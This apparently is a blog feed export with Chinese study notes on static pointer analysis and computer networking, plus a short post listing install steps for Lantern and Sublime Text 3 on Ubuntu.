<p><img src="/2021/11/15/软件分析笔记/image-20211014205411790.png" alt="image-20211014205411790"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014205434270.png" alt="image-20211014205434270"></p>
<p>-</p>
<p>一个例子，里面黄色部分标注的边其实没有也可以呀，但是还是要有</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014224154286.png" alt="image-20211014224154286"></p>
<p>-</p>
<h2 id="Interprocedural-Data-Flow-Analysis"><a href="#Interprocedural-Data-Flow-Analysis" class="headerlink" title="Interprocedural Data-Flow Analysis"></a>Interprocedural Data-Flow Analysis</h2><p>主要处理多出来的两种边</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014210546045.png" alt="image-20211014210546045"></p>
<p>-</p>
<p>之所以要有b = addOne(a)到c=b-3的边（这样的边称为call-to-return edge），因为a=6这样的local dataflow如果跟着过程调用跑一遍会低效，如下图</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014213717355.png" alt="image-20211014213717355"></p>
<p>-</p>
<p>注意要kill b，这样才能和返回值merge成常量，不然就是NAC了，丢失精度</p>
<p>kill b的位置不是call site，而是call-to-return edge的transfer edge时kill。call site只做恒等变换</p>
<p>-插播TT的话</p>
<blockquote>
<p>现在对于调用语句（如x = m(…);）的node transfer改为identity function（见87页），把kill LHS variable值的操作挪到了call-to-return edge的edge transfer当中（见100—103页对b = ten()的处理）。此外作为参考，105页总结了interprocedural constant propagation的node/edge transfer。</p>
<p>做出上述改动是为了可以更一致地处理不同类型的ICFG edges，同时简化interprocedural data-flow analysis solver的算法与实现。相关作业文档也会讲解改动后的算法，届时请同学们以最新课件以及作业文档为准。</p>
</blockquote>
<p><img src="/2021/11/15/软件分析笔记/image-20211014224445529.png" alt="image-20211014224445529"></p>
<p>-</p>
<p>一个小总结</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014224435597.png" alt="image-20211014224435597"></p>
<p>-</p>
<p>重点</p>
<ul>
<li>怎么建立class hierarchy analysis？从main开始一个类似BFS</li>
<li>过程间分析要处理哪些关键？与过程内分析有哪些区别？—过程间要处理call edge和return edge。比起过程内，过程间的结果更精确</li>
<li>过程间的常量传播是怎么处理edge的？</li>
</ul>
<p><img src="/2021/11/15/软件分析笔记/image-20211014215007255.png" alt="image-20211014215007255"></p>
<p>-</p>
<p>后续预告</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211014215157202.png" alt="image-20211014215157202"></p>
<h1 id="class-8-Pointer-Analysis"><a href="#class-8-Pointer-Analysis" class="headerlink" title="class-8 Pointer Analysis"></a>class-8 Pointer Analysis</h1><p>五节课介绍他</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021183247914.png" alt="image-20211021183247914"></p>
<p>-</p>
<p>这个例子里CHA只考虑了class hierarchy，所以不精确</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021183751766.png" alt="image-20211021183751766"></p>
<p>-</p>
<p>指针分析的话，看n具体指向哪个对象</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021183925280.png" alt="image-20211021183925280"></p>
<p>-</p>
<h2 id="Pointer-Analysis"><a href="#Pointer-Analysis" class="headerlink" title="Pointer Analysis"></a>Pointer Analysis</h2><p>指针分析研究有一个pointer可以指向什么值</p>
<p>指针分析是may analysis，做保守的分析</p>
<p>即使过了40年之久，指针分析还是一个活跃的问题</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021184522912.png" alt="image-20211021184522912"></p>
<p>-</p>
<p>输出一个表格</p>
<p>variable和field都是指针，都要考虑</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021185146606.png" alt="image-20211021185146606"></p>
<p>-</p>
<p>当程序规模扩大的时候就问题来了，如何做的又快又准</p>
<p>-</p>
<p>指针分析和别名分析（alias analysis）</p>
<p>别名分析回答的是：两个指针是否指向同一个object</p>
<p>可以看出别名分析可以从指针分析中得到，指针分析更难</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021185551451.png" alt="image-20211021185551451"></p>
<p>-</p>
<p>指针分析应用</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021185852463.png" alt="image-20211021185852463"></p>
<p>德国的dagstuhl seminar每年举办研讨会，大佬都说指针分析最重要：）</p>
<p>-</p>
<h2 id="哪些因素会影响指针分析的精度和效率"><a href="#哪些因素会影响指针分析的精度和效率" class="headerlink" title="哪些因素会影响指针分析的精度和效率"></a>哪些因素会影响指针分析的精度和效率</h2><p>下面展开说</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021190413127.png" alt="image-20211021190413127"></p>
<p>-</p>
<h3 id="heap-abstraction"><a href="#heap-abstraction" class="headerlink" title="heap abstraction"></a>heap abstraction</h3><p>heap里可能new出无限个对象，循环停不下来，如果静态分析也跟着while跑，那分析也停不下来，所以需要做抽象。</p>
<p>抽象成有限个对象</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021190637856.png" alt="image-20211021190637856"></p>
<p>-</p>
<p>咋做抽象的呢？</p>
<p>一类是store based model，另一类是storeless</p>
<p>调用点抽象是最常用的</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021190752797.png" alt="image-20211021190752797"></p>
<p>-</p>
<p>allocation-site abstraction</p>
<p>循环里new三次，我们就用一个o2来抽象</p>
<p>程序里有几句new，就有几个o2，所以是有限的</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021191039909.png" alt="image-20211021191039909"></p>
<p>-</p>
<h3 id="context-sensitivity"><a href="#context-sensitivity" class="headerlink" title="context sensitivity"></a>context sensitivity</h3><p>一个method被不同地方调用时有不同的上下文</p>
<p>上下文敏感就是区分上下文，精度更高。不敏感就是凡是上下文全放一起，不区分，更快。</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021191537505.png" alt="image-20211021191537505"></p>
<p>上下文的概念在interaprocedural中都会用到，比如你跨函数的constant propagation，分开就是不同c1 c2，合一起就是NAC</p>
<p>-</p>
<h3 id="flow-sensitivity"><a href="#flow-sensitivity" class="headerlink" title="flow sensitivity"></a>flow sensitivity</h3><p>流敏感：对于每个程序点（语句之类）都记录了这个点上的信息</p>
<p>流不敏感：不关心语句执行顺序，一锅端，要考虑所有顺序</p>
<p>-</p>
<p>流敏感要存的信息量很大，对于OO语言来说开销太大，比如java里，栈内存会自动销毁，堆内存只能靠垃圾回收，静态分析时候为了sound，就得全考虑进去，程序跑到后面就越来越大。1亿条的表格没法存了都</p>
<p>所以还是流不敏感能用</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021194312939.png" alt="image-20211021194312939"></p>
<p>-</p>
<h3 id="analysis-scope"><a href="#analysis-scope" class="headerlink" title="analysis scope"></a>analysis scope</h3><p>全程序分析提供全部分析</p>
<p>需求驱动的只关心需求里的那些pointer，以及会影响这些pointer的东西（拔出萝卜带出泥，对复杂程序开销也不小，且只满足一种需求，万一多个客户，有冗余）</p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021194726188.png" alt="image-20211021194726188"></p>
<p>-</p>
<h2 id="哪些对象我们关心"><a href="#哪些对象我们关心" class="headerlink" title="哪些对象我们关心"></a>哪些对象我们关心</h2><p>程序里有很多复杂语句，但我们不关心，只关心影响pointer的语句</p>
<p>-</p>
<p>关心的对象有这些东西</p>
<p>static field类似全局变量，和local variable一起处理。</p>
<p>数组有很多下标，但在静态分析里我们只认为有一个array.arr，和instance field一样处理</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021195437562.png" alt="image-20211021195437562"></p>
<p>-</p>
<h2 id="哪些语句我们关心"><a href="#哪些语句我们关心" class="headerlink" title="哪些语句我们关心"></a>哪些语句我们关心</h2><p>影响指针的语句</p>
<p>x.f.g.h这种可以打散成左边的五种</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021200002506.png" alt="image-20211021200002506"></p>
<p>-</p>
<p>focus on最难的virtual call</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021200043002.png" alt="image-20211021200043002"></p>
<p>-</p>
<p>重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021200222820.png" alt="image-20211021200222820"></p>
<p>-</p>
<p>别着急，还有一部分。。</p>
<h1 id="class-8-2-Pointer-Analysis-Foundations"><a href="#class-8-2-Pointer-Analysis-Foundations" class="headerlink" title="class-8-2 Pointer Analysis Foundations"></a>class-8-2 Pointer Analysis Foundations</h1><h2 id="指针分析的domain"><a href="#指针分析的domain" class="headerlink" title="指针分析的domain"></a>指针分析的domain</h2><p>variable + instance field = Pointers</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021200830016.png" alt="image-20211021200830016"></p>
<p>-</p>
<p>rule是推导式，横线上面是前提，横线下面是结论</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021200951206.png" alt="image-20211021200951206"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021201418578.png" alt="image-20211021201418578"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021201441970.png" alt="image-20211021201441970"></p>
<p>-</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211021201638832.png" alt="image-20211021201638832"></p>
<h1 id="class-9"><a href="#class-9" class="headerlink" title="class-9"></a>class-9</h1><h2 id="实现Pointer-Analysis"><a href="#实现Pointer-Analysis" class="headerlink" title="实现Pointer Analysis"></a>实现Pointer Analysis</h2><p>课上的算法易于理解，重新设计过了，而且比较完备</p>
<p>指针分析是指向关系在指针之间传播</p>
<p>有的研究人员（andersen，安徒生）认为指针分析是在求解约束关系（Andersen-style analysis）</p>
<p>-</p>
<p>实现的关键是处理变化，传播这种变化</p>
<p>用图来帮助描述分析</p>
<p>-</p>
<h2 id="Pointer-Flow-Graph（PFG）"><a href="#Pointer-Flow-Graph（PFG）" class="headerlink" title="Pointer Flow Graph（PFG）"></a>Pointer Flow Graph（PFG）</h2><p>node就是pointer</p>
<p>edge指的是流向关系，x-&gt;y说明x指向的对象may流到y去</p>
<blockquote>
<p> 为什么是may？pointer analysis是一个may analysis，多包含了一些信息</p>
<p>哪些边是may flow to呢？后面说</p>
</blockquote>
<p><img src="/2021/11/15/软件分析笔记/image-20211028184409571.png" alt="image-20211028184409571"></p>
<p>-</p>
<p>例如</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028185229994.png" alt="image-20211028185229994"></p>
<p>-</p>
<p>例子</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028185701761.png" alt="image-20211028185701761"></p>
<p>-</p>
<p>如果新加一句b=new T()，pt(b) = {oj}这件事会流到e</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028185730665.png" alt="image-20211028185730665"></p>
<p>-</p>
<p>实现PA难得地方在于，建立PFG，和传播指针信息是相互依赖的</p>
<p>所以PA不是单纯的传递闭包问题</p>
<blockquote>
<p> 1依赖2体现在，首先得知道c指向oi，然后才能得出a-&gt;oi.f这些边</p>
</blockquote>
<p><img src="/2021/11/15/软件分析笔记/image-20211028190255073.png" alt="image-20211028190255073"></p>
<p>-</p>
<h2 id="PA-Algorithm"><a href="#PA-Algorithm" class="headerlink" title="PA Algorithm"></a>PA Algorithm</h2><p>算法如下，solve是main函数</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028190703475.png" alt="image-20211028190703475"></p>
<p>-</p>
<p>为啥需要第3条呢？假如s-&gt;t这条边已经建立了，那么当s的指针集变化时，s的指针集会传给t，没有问题，但假如s-&gt;t还没有建立，没有第3条的话，t指向的对象就少了</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028192039251.png" alt="image-20211028192039251"></p>
<p>-</p>
<p>从WL里取出一个指针和指针集</p>
<p>差集delta，减少冗余计算，这样做不会漏传，因为pt(n)中含有的东西已经/在之后肯定会传播出去</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028193914335.png" alt="image-20211028193914335"></p>
<p>-</p>
<p>传播</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028194204186.png" alt="image-20211028194204186"></p>
<p>-</p>
<p>下面处理field的问题</p>
<blockquote>
<p>为啥是may引入新边呢？</p>
<p>比如有个x2.f = y先让y指向oi.f了，那就不用有新边了</p>
</blockquote>
<p><img src="/2021/11/15/软件分析笔记/image-20211028195824894.png" alt="image-20211028195824894"></p>
<p>-</p>
<p>一个例子，看ppt走一遍</p>
<p>-</p>
<p>重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211028201529968.png" alt="image-20211028201529968"></p>
<h1 id="class-10"><a href="#class-10" class="headerlink" title="class-10"></a>class-10</h1><h2 id="Pointer-Analysis-with-Method-Calls"><a href="#Pointer-Analysis-with-Method-Calls" class="headerlink" title="Pointer Analysis with Method Calls"></a>Pointer Analysis with Method Calls</h2><p>过程间分析的时候，需要知道参数a指向了哪些对象，就是需要建立Call Graph，但是这个call graph的建立也依赖a</p>
<p>所以，指针分析和call graph的建立是互相依赖的</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104184059991.png" alt="image-20211104184059991"></p>
<p>-</p>
<p>call的rule：</p>
<p>this看成一个特殊的参数，他决定了callee是谁</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104185416934.png" alt="image-20211104185416934"></p>
<p>为啥x不能新建一条指向m_this的边呢？</p>
<p>如果x指向 new A，那么dispatch的m结果是A.foo，A.this指向new A；如果x指向new B，那么dispatchm结果是B.foo，B.this指向new B，C也是一样。</p>
<p>如果x指向 {new A, new B, new C}，但是A.this只能指向单一对象new A，把ABC都传过去就不对了</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104190546640.png" alt="image-20211104190546640"></p>
<p>-</p>
<p>我们只分从main开始的reachable的mothods，这样的好处是精度和时间复杂度都好</p>
<p>精度为什么好？如果我特地额外分析了unreachable的方法（如m9），假如这个m9指向了m4，会导致m4里的指针新增了“m9里的指针指向的那些玩意”，那就不准嘞</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104192009651.png" alt="image-20211104192009651"></p>
<p>-</p>
<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><p>算法的主体部分和上节课的不涉及过程调用的指针分析差不多</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104194836829.png" alt="image-20211104194836829"></p>
<p>-</p>
<p>问题1：为什么addReachable只处理x = new T()和x = y这两种语句呢</p>
<p>因为其他的x.f = y，在新方法被分析时，x的指针集是空的，没法分析啊</p>
<p>但是x = new T() 和 x=y是确定的</p>
<p>-</p>
<p>问题2：processCall中为什么要判断l-&gt;m不属于CG？</p>
<p>m是dispatch的结果，可能之前有其他变量也dispatch出m了</p>
<p>-</p>
<p>一个例子，自己看ppt，需要注意的是x = new T()其实分两步：</p>
<ol>
<li>x = new T</li>
<li>x.\<init\>()</init\></li>
</ol>
<p>-</p>
<p>重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211104202047234.png" alt="image-20211104202047234"></p>
<h1 id="class-11-Pointer-Analysis-Context-Sensitivity"><a href="#class-11-Pointer-Analysis-Context-Sensitivity" class="headerlink" title="class-11 Pointer Analysis Context Sensitivity"></a>class-11 Pointer Analysis Context Sensitivity</h1><p>按之前学的，x和y的值来源于n，n来源于n1和n2，那么pt(x) = {new One(), new Two()}</p>
<p>但实际上程序执行的时候，x只指向 new One()，产生了精度损失</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111183952505.png" alt="image-20211111183952505"></p>
<p>-</p>
<p>如果我们把id分开处理，就可以提升精度</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111184237249.png" alt="image-20211111184237249"></p>
<p>-</p>
<h2 id="Context-Insensitivity为什么不准"><a href="#Context-Insensitivity为什么不准" class="headerlink" title="Context Insensitivity为什么不准"></a>Context Insensitivity为什么不准</h2><p>因为他把method call的上下文混在一起，这些混合的上下文通过method的返回值和副作用传播了出去，造成假的数据流</p>
<p>-</p>
<h2 id="Context-Sensitivity"><a href="#Context-Sensitivity" class="headerlink" title="Context Sensitivity"></a>Context Sensitivity</h2><p>一种好理解的：java抛异常时候的调用栈</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111190310520.png" alt="image-20211111190310520"></p>
<p>-</p>
<p>堆也需要上下文，细分对象</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111191241381.png" alt="image-20211111191241381"></p>
<p>-</p>
<p>一个例子</p>
<p>在没有heap context的时候，虽然x1，x2都分开了，但是第八行的new X，o8.f同时指向o1 o2，就丢精度了</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111193935044.png" alt="image-20211111193935044"></p>
<p>-</p>
<p>另一个例子，没有变量context，有heap context的话，也不对</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111193747076.png" alt="image-20211111193747076"></p>
<p>-</p>
<h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><p>把乱七八糟的东西前面都加上c</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211111194619784.png" alt="image-20211111194619784"></p>
<p>-</p>
<p>new，assign，store，load</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211112110325621.png" alt="image-20211112110325621"></p>
<p>-</p>
<p>invoke</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211112112255565.png" alt="image-20211112112255565"></p>
<p>需要注意的是Select，需要继承（？）一下caller的上下文，所以需要用到call site的信息，和call site的上下文信息</p>
<p>-</p>
<p>本讲重点</p>
<p><img src="/2021/11/15/软件分析笔记/image-20211112112418039.png" alt="image-20211112112418039"></p>
]]></content>
      <categories>
        <category>Program Analysis</category>
      </categories>
      <tags>
        <tag>Static Program Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安装参考网站</title>
    <url>/2019/02/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8F%82%E8%80%83%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>本文包含一些软件的优秀安装指南，都是亲测可用的。以备以后重新安装系统快速使用，本文会热更新。</p>
<p>每段的格式为：</p>
<ul>
<li><p>[已有教程网址]</p>
</li>
<li><p>[排除教程中的坑]</p>
</li>
<li><p>[对教程中的简要概括(防止教程404)]</p>
</li>
</ul>
<hr>
<h1 id="蓝灯lantern"><a href="#蓝灯lantern" class="headerlink" title="蓝灯lantern"></a>蓝灯lantern</h1><ul>
<li><p>教程：<a href="http://www.pianshen.com/article/5553973/" target="_blank" rel="noopener">lantern傻瓜式安装教程</a></p>
</li>
<li><p>排坑：进入 <a href="https://github.com/getlantern/lantern" target="_blank" rel="noopener">https://github.com/getlantern/lantern</a> 最下面。如果左击 <strong>ubuntu 14.04 64 bit</strong> 后没有直接下载：右击 <strong>ubuntu 14.04 64 bit</strong> 用迅雷下载链接。</p>
</li>
</ul>
<hr>
<h1 id="sublime-text-3"><a href="#sublime-text-3" class="headerlink" title="sublime text 3"></a>sublime text 3</h1><ul>
<li><p>教程：<a href="https://jingyan.baidu.com/article/64d05a023cd849de55f73be4.html" target="_blank" rel="noopener">命令行安装sublime text 3</a></p>
</li>
<li><p>概括：三条命令即可</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/sublime-text-3</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sublime-text-installer</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>计网讲课笔记</title>
    <url>/2020/07/10/%E8%AE%A1%E7%BD%91%E8%AE%B2%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>计网讲课笔记</p>
<hr>
<h1 id="ch1-概论"><a href="#ch1-概论" class="headerlink" title="ch1 概论"></a>ch1 概论</h1><h2 id="需要掌握的问题"><a href="#需要掌握的问题" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>Internet是什么？由什么组成？</li>
<li>网络边缘是什么？</li>
<li>接入网络是什么？</li>
<li>网络核心是什么？</li>
<li>电路交换、分组交换、虚电路是怎么运作的？</li>
<li>为什么需要多层协议体系结构？（分层的好处）</li>
<li>OSI七层模型是哪七层？每一层的功能是什么？</li>
<li>TCP/IP模型是哪五层、每一层的功能是什么？</li>
<li>七层和五层的对应关系是什么样的？</li>
<li>网络核心是如何传输数据的（网络核心的两大功能）</li>
<li>电子邮件用到的应用层协议名称</li>
<li>传输时延、传播时延、排队时延、处理时延是什么？</li>
</ol>
<h2 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h2><h3 id="1-Internet是什么？由什么组成？"><a href="#1-Internet是什么？由什么组成？" class="headerlink" title="1. Internet是什么？由什么组成？"></a>1. Internet是什么？由什么组成？</h3><p>因特网是许多小网络相互连接而成，小网络中包含终端、路由器、网络传输介质</p>
<p>三大组成：网络边缘、接入网络、网络核心</p>
<h3 id="2-网络边缘是什么？"><a href="#2-网络边缘是什么？" class="headerlink" title="2. 网络边缘是什么？"></a>2. 网络边缘是什么？</h3><p>终端，比如手机、笔记本、智能手环、智能家电等等</p>
<h3 id="3-接入网络是什么？"><a href="#3-接入网络是什么？" class="headerlink" title="3. 接入网络是什么？"></a>3. 接入网络是什么？</h3><p>物理传输介质，比如双绞线、光纤</p>
<p>无线链路</p>
<h3 id="4-网络核心是什么？"><a href="#4-网络核心是什么？" class="headerlink" title="4. 网络核心是什么？"></a>4. 网络核心是什么？</h3><p>路由器（这里的路由器不是单单指家里的那个路由器，他是具备转发和路由功能的机器的统称）</p>
<h3 id="5-电路交换、分组交换、虚电路是怎么运作的？"><a href="#5-电路交换、分组交换、虚电路是怎么运作的？" class="headerlink" title="5. 电路交换、分组交换、虚电路是怎么运作的？"></a>5. 电路交换、分组交换、虚电路是怎么运作的？</h3><p>电路交换：类似于老电话，你告诉接线员你想打哪个号码，接线员给你接上去，建立专用电路，期间一直霸占专用电路，结束时拆除专用电路。实现简单，保证报文有序到达</p>
<ul>
<li><p>优点：数据传输路径可以预测、传输简单迅速</p>
</li>
<li><p>缺点：电路建立和拆除时操作复杂、用户数量扩展性差、中间交换机挂了的话电路交换也会挂</p>
</li>
</ul>
<p>分组交换：不建立专用电路，把长报文切成小块（分组），每个分组都记录源地址、目标地址、在长报文中的编号，然后逐个发出去。由于每个分组走的路不一定相同，所以需要处理达到报文乱序的问题、丢包问题、排队问题</p>
<ul>
<li>优点：有效利用了网络资源、实现简单</li>
<li>缺点：无法预测传输路径、需要缓冲区、需要拥塞控制</li>
</ul>
<p>虚电路：还是发小块（分组），但是路由的路径预先确定好，需要建立虚电路-通信-拆除虚电路，期间不会霸占线路</p>
<ul>
<li>优点：数据传输路径可以预测、有效利用网络资源</li>
<li>缺点：服务价格贵（因为实现复杂）、需要缓冲区</li>
</ul>
<h3 id="6-为什么需要多层协议体系结构？（分层的好处）"><a href="#6-为什么需要多层协议体系结构？（分层的好处）" class="headerlink" title="6. 为什么需要多层协议体系结构？（分层的好处）"></a>6. 为什么需要多层协议体系结构？（分层的好处）</h3><p>为上层屏蔽下层的细节，更专心上层的功能实现</p>
<p>每一层在更新自己的时候，只需要保持对上和对下的接口不变，提供的服务不变即可，不需要改动整体架构</p>
<h3 id="7-OSI七层模型是哪七层？每一层的功能是什么？"><a href="#7-OSI七层模型是哪七层？每一层的功能是什么？" class="headerlink" title="7. OSI七层模型是哪七层？每一层的功能是什么？"></a>7. OSI七层模型是哪七层？每一层的功能是什么？</h3><p>OSI七层从下到上分别是：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层</p>
<p>每一层都负责提供给上层更强一点的功能</p>
<p>物理层：按比特传数据，可能发生错误，常用介质是光纤、双绞线</p>
<ul>
<li>宏观上是光纤的两端在通信</li>
</ul>
<p>数据链路层：按帧（帧就是有格式的比特串）传数据，可以保证帧传出去和接到的是一样的，没有比特错误</p>
<ul>
<li>宏观上是两台有MAC地址的交换机在通信</li>
</ul>
<p>网络层：<strong>尽力</strong>让数据包（数据包就是头部信息+链路层的帧）到达目的地</p>
<ul>
<li>宏观上是两台有IP地址的计算机在通信</li>
</ul>
<p>传输层：<strong>保证</strong>让传输层的包（头部信息+数据包）到达目的地</p>
<ul>
<li>一台计算机上的一个进程，和另一台计算机上的一个进程的通信，标识符是进程的端口号</li>
</ul>
<p>会话层、表示层、应用层：通过前面4层发送数据，从而实现交流</p>
<p><em>示意图：应用层的信息M是如何一层层封装，传到另一台计算机，再一层层解封装的</em></p>
<p><img src="/2020/07/10/计网讲课笔记/image-20200710183325823.png" alt="image-20200710183325823"></p>
<h3 id="8、TCP-IP模型是哪五层、每一层的功能是什么？"><a href="#8、TCP-IP模型是哪五层、每一层的功能是什么？" class="headerlink" title="8、TCP/IP模型是哪五层、每一层的功能是什么？"></a>8、TCP/IP模型是哪五层、每一层的功能是什么？</h3><p>物理层、数据链路层、网络层、传输层、应用层</p>
<h3 id="9-七层和五层的对应关系是什么样的？"><a href="#9-七层和五层的对应关系是什么样的？" class="headerlink" title="9. 七层和五层的对应关系是什么样的？"></a>9. 七层和五层的对应关系是什么样的？</h3><p>七层里的上三层（会话层，表示层，应用层）合并为应用层</p>
<h3 id="10-网络核心是如何传输数据的（网络核心的两大功能）"><a href="#10-网络核心是如何传输数据的（网络核心的两大功能）" class="headerlink" title="10. 网络核心是如何传输数据的（网络核心的两大功能）"></a>10. 网络核心是如何传输数据的（网络核心的两大功能）</h3><p>路由和转发</p>
<p>路由：选择下一跳应该发往哪个router</p>
<p>转发：把数据从router的入口发往路由器的出口</p>
<h3 id="11-电子邮件用到的应用层协议名称"><a href="#11-电子邮件用到的应用层协议名称" class="headerlink" title="11. 电子邮件用到的应用层协议名称"></a>11. 电子邮件用到的应用层协议名称</h3><p>SMTP、MINE、POP、IMAP</p>
<h3 id="12-发送时延-传输时延、传播时延、排队时延、处理时延是什么？"><a href="#12-发送时延-传输时延、传播时延、排队时延、处理时延是什么？" class="headerlink" title="12. 发送时延/传输时延、传播时延、排队时延、处理时延是什么？"></a>12. 发送时延/传输时延、传播时延、排队时延、处理时延是什么？</h3><p>发送时延/传输时延：英文transmission delay，指主机/路由器把一个数据帧放到信道上所花的时间</p>
<ul>
<li>发送时延 = 数据帧长度（b） / 信道带宽（b/s）</li>
</ul>
<p>传播时延：英文propagation delay，指的是信道长度 / 介质的速率。</p>
<ul>
<li>传播时延 = 信道长度（m） / 电磁波在信道上的传播速率（m/s）</li>
</ul>
<p>排队时延：数据帧到达路由器的时候，会进入输入队列等待，在路由器确定转发出口后，还要进入输出队列等待</p>
<p>处理时延：主机或路由器收到分组时会花时间处理，比如插入输入队列、决定走哪个出口出去、解析分组内容等</p>
<h1 id="ch2-数据链路层"><a href="#ch2-数据链路层" class="headerlink" title="ch2 数据链路层"></a>ch2 数据链路层</h1><h2 id="需要掌握的问题-1"><a href="#需要掌握的问题-1" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><p>传输和流量控制</p>
<ol>
<li>单工、半双工、全双工是什么？</li>
<li>停等协议（stop-and-wait）是怎么运作的？</li>
<li>滑动窗口（sliding window）中，发送方的窗口左边界会在什么时候更新？接收方的窗口左边界会在什么时候更新？</li>
<li>滑动窗口中，接收方向发送方发送ACK的时候，ACK的值是什么？</li>
</ol>
<hr>
<p>检测和纠正比特错误</p>
<ol>
<li>二维的奇偶校验（Parity Checking）的行parity bit和列parity bit是怎么计算的，以及怎么纠错的？</li>
<li>CRC校验，给定D=101110，r=3，G=1001，要求计算校验码R</li>
</ol>
<hr>
<p>链路层的包</p>
<ol>
<li>HDLC的flag字段的组成，发送方如何预处理包以避免和flag重复？接收方如何恢复包里的内容？</li>
</ol>
<p>令牌环</p>
<ol>
<li>拿到令牌时，如果没有要发送的数据包，做什么？如果有要发送的数据包，做什么？</li>
</ol>
<hr>
<p>以太网</p>
<ol>
<li>以太网的速率在多少到多少之间？</li>
<li>时分复用，频分复用，码分复用</li>
<li>时隙ALOHA工作过程，工作效率</li>
<li>纯ALOHA工作过程，工作效率</li>
<li>CSMA/CD工作过程，工作效率</li>
<li>什么是二进制指数后退算法</li>
</ol>
<hr>
<p>交换机</p>
<ol>
<li>spanning-tree算法</li>
<li>交换机的转发和过滤过程</li>
<li>交换机的自学习过程</li>
</ol>
<hr>
<p>无线链路</p>
<ol>
<li>CSMA/CA 协议的工作过程</li>
<li>为什么CSMA/CD 在无线环境中不适用</li>
</ol>
<h2 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h2><p>传输和流量控制</p>
<h3 id="1-单工、半双工、全双工是什么？"><a href="#1-单工、半双工、全双工是什么？" class="headerlink" title="1. 单工、半双工、全双工是什么？"></a>1. 单工、半双工、全双工是什么？</h3><p>单工：只能由发送方往接收方发消息</p>
<p>半双工：双方可以互发消息，但同一时间只能有一方的消息在载体上传输</p>
<p>全双工：双方可以互发消息，可以同时发送消息和接收消息</p>
<h3 id="2-停等协议（stop-and-wait）是怎么运作的？"><a href="#2-停等协议（stop-and-wait）是怎么运作的？" class="headerlink" title="2. 停等协议（stop-and-wait）是怎么运作的？"></a>2. 停等协议（stop-and-wait）是怎么运作的？</h3><p>发送方：发包，然后等待</p>
<p>接受方：收到包后回复ACK</p>
<p>发送方：收到ACK后再发下一个包</p>
